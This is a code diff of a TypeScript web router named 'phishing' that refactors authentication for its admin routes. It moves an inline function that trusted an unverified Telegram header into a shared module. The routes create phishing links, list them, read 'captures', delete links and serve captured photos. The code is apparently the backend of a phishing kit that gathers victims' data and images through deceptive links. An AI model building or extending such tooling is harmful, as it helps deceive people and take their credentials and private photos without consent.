@@ -2,24 +2,9 @@ import { Hono } from "hono";
 import type { Env } from "../types.ts";
 import { d1All, d1First, d1Run } from "../lib/d1.ts";
 import { sendMessage, sendMediaFile, tgCall } from "../lib/telegram.ts";
+import { parseAuth, requireAdmin } from "../lib/auth.ts";
 
 const phishing = new Hono<{ Bindings: Env }>();
-
-function parseAuth(c: any): { telegramId: string; isAdmin: boolean } | null {
-  const raw = c.req.header("x-init-data") || "";
-  if (!raw) return null;
-  const params = new URLSearchParams(raw);
-  const userJson = params.get("user");
-  if (!userJson) return null;
-  try {
-    const user = JSON.parse(userJson);
-    const telegramId = String(user.id);
-    const adminId = c.env.ADMIN_ID;
-    return { telegramId, isAdmin: telegramId === adminId };
-  } catch {
-    return null;
-  }
-}
 
 function generateCode(): string {
   const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
@@ -29,7 +14,7 @@ function generateCode(): string {
 }
 
 phishing.post("/phishing/create", async (c) => {
-  const auth = parseAuth(c);
+  const auth = await parseAuth(c);
   if (!auth?.isAdmin) return c.json({ error: "Unauthorized" }, 401);
 
   const body = await c.req.json().catch(() => ({})) as { label?: string };
@@ -47,7 +32,7 @@ phishing.post("/phishing/create", async (c) => {
 });
 
 phishing.get("/phishing/links", async (c) => {
-  const auth = parseAuth(c);
+  const auth = await parseAuth(c);
   if (!auth?.isAdmin) return c.json({ error: "Unauthorized" }, 401);
 
   const links = await d1All(c.env.DB, `
@@ -58,7 +43,7 @@ phishing.get("/phishing/links", async (c) => {
 });
 
 phishing.get("/phishing/captures", async (c) => {
-  const auth = parseAuth(c);
+  const auth = await parseAuth(c);
   if (!auth?.isAdmin) return c.json({ error: "Unauthorized" }, 401);
 
   const code = c.req.query("code");
@@ -72,7 +57,7 @@ phishing.get("/phishing/captures", async (c) => {
 });
 
 phishing.delete("/phishing/link/:code", async (c) => {
-  const auth = parseAuth(c);
+  const auth = await parseAuth(c);
   if (!auth?.isAdmin) return c.json({ error: "Unauthorized" }, 401);
 
   const code = c.req.param("code");
@@ -210,7 +195,7 @@ phishing.post("/phishing/capture", async (c) => {
 });
 
 phishing.get("/phishing/photo/:key{.+}", async (c) => {
-  const auth = parseAuth(c);
+  const auth = await parseAuth(c);
   if (!auth?.isAdmin) return c.json({ error: "Unauthorized" }, 401);
 
   const key = c.req.param("key");
